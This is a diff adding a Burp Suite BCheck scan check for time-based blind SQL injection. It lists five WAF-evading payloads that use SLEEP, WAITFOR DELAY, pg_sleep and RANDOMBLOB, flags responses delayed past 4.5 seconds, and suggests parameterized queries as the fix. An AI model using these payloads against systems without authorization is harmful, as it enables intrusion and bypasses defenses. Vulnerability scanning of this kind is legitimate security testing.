@@ -1,0 +1,24 @@
+metadata:
+    language: v2-beta
+    name: "SQLi - Time Based Blind with WAF Bypass"
+    description: "Tests for time-based blind SQL injection with obfuscated SLEEP/WAITFOR/pg_sleep payloads"
+    author: "BCheck Arsenal"
+    tags: "sqli", "blind", "time-based", "waf-bypass"
+
+given insertion point then
+    send payload:
+        replacing: "{insertion_point}"
+        following replacements:
+            - "1' /*!50000AnD*/ (/*!50000SeLeCt*/ /*!50000SlEeP(5)*/)-- -"
+            - "1'||(sElEcT iF(1=1,sLeEp(5),0))||'"
+            - "1';wAiTfOr dElAy '0:0:5'--"
+            - "1';sElEcT pG_sLeEp(5)--"
+            - "1' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))--"
+
+    if {check.response.time} is greater than 4500 then
+        report issue:
+            severity: high
+            confidence: tentative
+            detail: "Time-based blind SQL injection detected. The application delayed response by approximately 5 seconds when injected with a sleep payload."
+            remediation: "Use parameterized queries or prepared statements. Implement query execution timeouts."
+    end if
